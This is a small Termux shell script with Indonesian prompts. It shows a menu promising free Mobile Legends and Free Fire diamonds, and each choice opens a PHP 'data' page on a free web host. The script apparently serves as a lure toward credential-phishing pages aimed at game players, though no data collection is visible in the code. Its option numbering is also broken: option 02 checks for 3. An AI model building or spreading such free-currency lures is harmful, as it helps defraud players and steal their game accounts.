clear
#bagian warna
merah="\033[31;1m"
putih="\033[39;1m"
#bagian tampilan
toilet -f slant --gay "      MENU"
printf "██████████████████████████████████████████████████████
          01. Diamond Mobile Legend (DM: 110)
          02. Diamond Freefire (DM: 230)
          00.exit
██████████████████████████████████████████████\n"
#bagian perintah
printf "\n${putih}[${merah}+${putih}]pilihan= " gameo
read gameo
if [ $gameo = 1 ] || [ $gameo = 01 ];then
termux-open https://bulan-bintang123.000webhostapp.com/dataml.php
sleep 1
sh menu.sh
elif [ $gameo = 3 ] || [ $gameo = 03 ];then
termux-open https://bulan-bintang123.000webhostapp.com/dataff.php
sleep 1
sh menu.sh
elif [ $gameo = 0 ] || [ $gameo = 00 ];then
clear
exit
else
printf "${merah}!!!! input salah atau tidak boleh kosong !!!!"
sleep 1
sh menu.sh
fi